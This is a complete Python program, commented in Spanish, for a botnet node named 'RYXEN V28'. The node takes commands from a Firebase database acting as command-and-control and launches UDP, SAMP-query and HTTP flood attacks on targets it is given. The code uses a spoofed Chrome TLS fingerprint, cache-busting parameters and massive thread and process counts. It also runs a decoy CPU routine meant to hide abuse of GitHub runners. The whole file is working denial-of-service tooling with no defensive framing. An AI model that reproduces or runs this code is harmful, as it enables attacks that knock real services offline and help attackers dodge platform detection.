import asyncio, aiohttp, time, random, ssl, socket, threading, multiprocessing, struct, math

# CONFIGURACIÓN RYXEN V28
DB_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/attack.json"
NODES_URL = "https://ryxen-c2-default-rtdb.firebaseio.com/nodes"

# --- MÓDULO DE EVASIÓN Y ESTABILIDAD (Gatitos y Mates) ---
def stability_shield():
    """Mantiene la CPU activa con patrones que parecen tareas legítimas"""
    while True:
        # Simulamos cálculos de análisis de datos
        for _ in range(500):
            _ = math.sqrt(random.random()) ** 2
        # Simulación de 'heartbeat' para que GitHub vea actividad constante
        time.sleep(random.uniform(0.1, 0.5))

# --- MOTOR L4 POTENCIADO (SAMP & UDP Payloads) ---
def l4_extreme_engine(ip, port, end_time, method):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Optimizamos el buffer del sistema para evitar cuellos de botella locales
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2048 * 1024)
    
    # Payload de consulta real para SAMP (Query Packet 'i')
    if ".samp" in method:
        try:
            ip_octets = [int(i) for i in ip.split('.')]
            payload = b"SAMP" + struct.pack('BBBB', *ip_octets) + struct.pack('H', int(port)) + b'i'
        except: payload = random._urandom(1024)
    else:
        # UDP Flood con payload de alta entropía
        payload = random._urandom(1400)

    while time.time() < end_time:
        try:
            # Enviamos ráfagas para maximizar el throughput
            for _ in range(50):
                sock.sendto(payload, (ip, int(port)))
        except: pass

# --- MOTOR L7 (Bypass & TLS Extreme) ---
async def l7_extreme_engine(target, end_time, semaphore):
    # Imitamos la huella digital (JA3) de Chrome 120/121
    ctx = ssl.create_default_context()
    ctx.set_ciphers('ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:TLS_AES_128_GCM_SHA256')
    ctx.check_hostname, ctx.verify_mode = False, ssl.CERT_NONE

    conn = aiohttp.TCPConnector(limit=0, ssl=ctx, family=socket.AF_INET, ttl_dns_cache=600)
    
    async with aiohttp.ClientSession(connector=conn) as session:
        while time.time() < end_time:
            async with semaphore:
                try:
                    # Bypass de caché mediante parámetros aleatorios y rutas dinámicas
                    dynamic_target = f"{target}?data={random.getrandbits(64)}"
                    headers = {
                        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Accept-Language': 'en-US,en;q=0.9',
                        'Cache-Control': 'no-cache',
                        'Pragma': 'no-cache',
                        'Referer': target
                    }
                    # Usamos GET pero cerramos rápido para maximizar RPS
                    async with session.get(dynamic_target, headers=headers, timeout=1, allow_redirects=False) as r:
                        await r.release()
                except: continue

def run_l7_process(target, end_time):
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    # Semáforo de alta concurrencia (320 hilos lógicos)
    sem = asyncio.Semaphore(25000)
    tasks = [l7_extreme_engine(target, end_time, sem) for _ in range(320)]
    loop.run_until_complete(asyncio.gather(*tasks))

async def main():
    nid = f"RX-NODE-{random.randint(1000, 9999)}"
    threading.Thread(target=stability_shield, daemon=True).start()
    
    async with aiohttp.ClientSession() as session:
        last_stamp = ""
        while True:
            try:
                # Reporte de estado a Firebase
                await session.put(f"{NODES_URL}/{nid}.json", json={"id": nid, "t": time.time()})
                
                async with session.get(DB_URL, timeout=5) as r:
                    data = await r.json()
                
                if data and data.get('stamp') != last_stamp:
                    last_stamp = data['stamp']
                    method, target, duration = data['method'], data['target'], int(data['time'])
                    
                    if duration > 0:
                        end_attack = time.time() + duration
                        if ".udp" in method or ".samp" in method:
                            h, p = target.split(':')
                            for _ in range(400): # Soltamos la cadena a los runners (400 hilos)
                                threading.Thread(target=l4_extreme_engine, args=(h, int(p), end_attack, method), daemon=True).start()
                        else:
                            # Multiprocesamiento para saturar todos los núcleos de la runner
                            for _ in range(multiprocessing.cpu_count()):
                                multiprocessing.Process(target=run_async_process, args=(target, end_attack), daemon=True).start()
            except: pass
            await asyncio.sleep(2)

def run_async_process(target, end_time):
    # Función auxiliar para el multiprocesamiento
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    sem = asyncio.Semaphore(25000)
    tasks = [l7_extreme_engine(target, end_time, sem) for _ in range(320)]
    loop.run_until_complete(asyncio.gather(*tasks))

if __name__ == "__main__":
    asyncio.run(main())
                                                        
